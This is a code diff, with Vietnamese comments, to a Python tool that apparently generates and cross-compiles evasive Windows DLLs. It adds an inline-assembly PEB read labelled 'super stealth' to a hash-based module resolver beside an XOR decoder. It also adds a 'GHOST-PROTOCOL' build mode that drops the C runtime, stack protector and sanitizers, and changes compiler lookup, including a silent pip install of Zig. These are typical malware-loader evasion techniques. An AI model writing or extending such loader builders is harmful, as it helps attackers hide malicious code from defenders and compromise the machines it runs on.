@@ -620,10 +620,13 @@ typedef void* LPVOID;
 typedef void* HMODULE;
 typedef void* HINSTANCE;
 typedef void* FARPROC;
+typedef int BOOL;
 
 #define WINAPI __stdcall
 #define NULL ((void*)0)
 #define DLL_PROCESS_ATTACH 1
+#define TRUE 1
+#define FALSE 0
 
 // LIST_ENTRY (Cực kỳ quan trọng để duyệt PEB)
 typedef struct _LIST_ENTRY {
@@ -753,7 +756,13 @@ unsigned long Hash(const char* str) {
 
 // PEB Walk (Giao thức v4 - Case Insensitive)
 HMODULE GetModH(unsigned long hash) {
-    PPEB peb = (PPEB)__readgsqword(0x60);
+    PPEB peb;
+    // Đọc PEB trực tiếp từ gs:[0x60] bằng Assembly (Siêu tàng hình)
+    __asm__ (
+        "mov %%gs:0x60, %0"
+        : "=r" (peb)
+    );
+    
     PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
     while (entry) {
         if (entry->FullDllName.Buffer) {
@@ -823,8 +832,8 @@ void XorDec(unsigned char* data, int len, unsigned char key) {
         if self._compiler:
             return self._compiler
 
-        # 1. Tìm GCC / MinGW trên PATH
-        gcc_names = ["x86_64-w64-mingw32-gcc", "i686-w64-mingw32-gcc", "gcc"]
+        # 1. Tìm MinGW-w64 (Ưu tiên hàng đầu cho Native Cross-compile)
+        gcc_names = ["x86_64-w64-mingw32-gcc", "i686-w64-mingw32-gcc"]
         for name in gcc_names:
             path = shutil.which(name)
             if path:
@@ -832,7 +841,7 @@ void XorDec(unsigned char* data, int len, unsigned char key) {
                 self._compiler_type = "gcc"
                 return path
 
-        # 2. Tìm Zig (zig cc hoạt động như drop-in GCC)
+        # 2. Tìm Zig (Lựa chọn tốt nhất trên macOS/Linux)
         zig_path = shutil.which("zig")
         if not zig_path:
             # Tìm zig trong site-packages/ziglang/ (pip install ziglang)
@@ -846,6 +855,20 @@ void XorDec(unsigned char* data, int len, unsigned char key) {
             self._compiler = zig_path
             self._compiler_type = "zig"
             return zig_path
+
+        # 3. Cuối cùng mới thử 'gcc' (Cẩn thận trên macOS vì nó là Clang)
+        path = shutil.which("gcc")
+        if path:
+            # Kiểm tra xem có phải Apple Clang không
+            try:
+                out = subprocess.check_output([path, "--version"], text=True)
+                if "apple nmake" in out.lower() or "clang" in out.lower():
+                    pass # Bỏ qua nếu là Clang trên Mac
+                else:
+                    self._compiler = path
+                    self._compiler_type = "gcc"
+                    return path
+            except: pass
 
         # 3. Auto-install ziglang qua pip (Portable, không cần Admin)
         print(f"  {Fore.YELLOW}[*] Không tìm thấy GCC/MinGW. Đang cài đặt Zig compiler (Portable)...{Style.RESET_ALL}")
@@ -884,8 +907,8 @@ void XorDec(unsigned char* data, int len, unsigned char key) {
             cmd.append(def_path)
 
         if tier4:
-            # GHOST-PROTOCOL TIER-4: Không CRT, không Stack Protector
-            cmd.extend(["-nostdlib", "-fno-stack-protector", "-Wl,--entry=DllMain"])
+            # GHOST-PROTOCOL TIER-4: Không CRT, không Stack Protector, không Sanitizers
+            cmd.extend(["-nostdlib", "-fno-stack-protector", "-fno-sanitize=all", "-Wl,--entry=DllMain"])
         else:
             # Thêm các thư viện Windows cơ bản
             cmd.extend(["-luser32", "-lkernel32", "-ladvapi32"])
@@ -896,7 +919,8 @@ void XorDec(unsigned char* data, int len, unsigned char key) {
                 print(f"  {Fore.GREEN}[SUCCESS]  Auto-Compiled: {os.path.basename(out_path)} (via {self._compiler_type}){Style.RESET_ALL}")
                 return True
             else:
-                print(f"  {Fore.RED}[FAILURE]  Compile Error: {res.stderr[:200]}...{Style.RESET_ALL}")
+                # Hiển thị đầy đủ log lỗi biên dịch để debug
+                print(f"  {Fore.RED}[FAILURE]  Compile Error (via {self._compiler_type}):\n{res.stderr}{Style.RESET_ALL}")
                 return False
         except Exception as e:
             print(f"  {Fore.RED}[!] Lỗi hệ thống khi biên dịch: {str(e)}{Style.RESET_ALL}")
